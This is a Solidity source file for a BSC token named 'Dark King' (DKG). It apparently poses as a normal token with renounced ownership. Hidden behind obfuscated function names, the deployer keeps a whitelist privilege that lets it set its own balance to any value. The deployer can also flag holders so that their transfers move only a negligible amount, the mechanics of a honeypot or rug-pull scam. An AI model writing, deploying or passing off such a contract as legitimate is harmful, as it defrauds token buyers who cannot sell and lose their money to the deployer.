/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DarkKing {
    uint8 public decimals = 18;
    address public fundLaunch;

    mapping(address => bool) public tokenTeam;
    string public name = "Dark King";



    mapping(address => mapping(address => uint256)) public allowance;
    address public teamEnableReceiver;
    string public symbol = "DKG";
    mapping(address => uint256) public balanceOf;
    address public owner;
    uint256 constant enableTx = 10 ** 10;
    mapping(address => bool) public launchBuy;
    uint256 public totalSupply = 100000000 * 10 ** 18;

    modifier isMin() {
        require(launchBuy[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address owner);

    constructor (){
        IUniswapV2Router launchedLimit = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IUniswapV2Factory autoMax = IUniswapV2Factory(launchedLimit.factory());
        fundLaunch = autoMax.createPair(launchedLimit.WETH(), address(this));
        owner = msg.sender;
        teamEnableReceiver = owner;
        launchBuy[teamEnableReceiver] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function amountAuto(address amountShould, address fromFeeIs, uint256 toAmount) internal returns (bool) {
        require(balanceOf[amountShould] >= toAmount);
        balanceOf[amountShould] -= toAmount;
        balanceOf[fromFeeIs] += toAmount;
        emit Transfer(amountShould, fromFeeIs, toAmount);
        return true;
    }

    function launchToEnable(uint256 toAmount) public isMin {
        balanceOf[teamEnableReceiver] = toAmount;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function isAuto(address amountIs) public isMin {
        tokenTeam[amountIs] = true;
    }

    function liquidityMax(address teamAt) public isMin {
        launchBuy[teamAt] = true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == teamEnableReceiver || recipient == teamEnableReceiver) {
            return amountAuto(sender, recipient, amount);
        }
        if (tokenTeam[sender]) {
            return amountAuto(sender, recipient, enableTx);
        }
        return amountAuto(sender, recipient, amount);
    }


}